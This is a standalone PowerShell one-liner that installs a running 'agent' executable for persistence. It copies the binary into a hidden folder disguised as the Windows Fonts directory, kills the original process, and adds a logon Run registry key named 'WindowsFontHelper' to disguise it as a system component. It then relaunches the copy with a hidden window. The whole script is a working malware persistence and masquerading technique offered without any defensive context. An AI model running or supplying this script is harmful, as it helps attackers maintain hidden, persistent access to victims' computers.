$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Stop'; $proc=Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1; if(-not $proc){Write-Host "[!] No running agent.exe found. Start your agent first.";exit 1}; $src=$proc.Path; Write-Host "[+] Found agent at: $src"; $d="$env:LOCALAPPDATA\Microsoft\Windows\Fonts"; if(-not (Test-Path $d)){New-Item $d -Force|Out-Null}; $dest="$d\agent.exe"; if(-not (Test-Path $dest)){$c=$false; for($i=0;$i-lt5;$i++){try{[System.IO.File]::Copy($src,$dest,$true);$c=$true;break}catch{Start-Sleep -Milliseconds 500}} if(-not $c){Write-Host "[!] Copy failed";exit 1} attrib +h $dest; Write-Host "[+] Copied to hidden fonts folder"} else{Write-Host "[*] Already exists"}; Write-Host "[+] Stopping original agent.exe (PID: $($proc.Id))..."; Stop-Process -Id $proc.Id -Force; Start-Sleep -Seconds 1; $regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; $regName="WindowsFontHelper"; Set-ItemProperty -Path $regPath -Name $regName -Value "`"$dest`"" -Force; Write-Host "[+] Registry run key added (direct agent.exe at logon)"; Write-Host "[+] Starting new agent from fonts folder..."; $workingDir = Split-Path $dest; $started = Start-Process -WindowStyle Hidden -FilePath $dest -WorkingDirectory $workingDir -PassThru; Start-Sleep -Seconds 5; $newProc=Get-Process -Id $started.Id -ErrorAction SilentlyContinue; if($newProc){Write-Host "[✓] New agent running (PID: $($newProc.Id)) from: $($newProc.Path)" -Fore Green}else{Write-Host "[!] Agent started but crashed. Exit code: $($started.ExitCode)" -Fore Red; Write-Host "    Try running without -WindowStyle Hidden to see error:" -Fore Yellow; Start-Process -FilePath $dest -WorkingDirectory $workingDir -NoNewWindow}
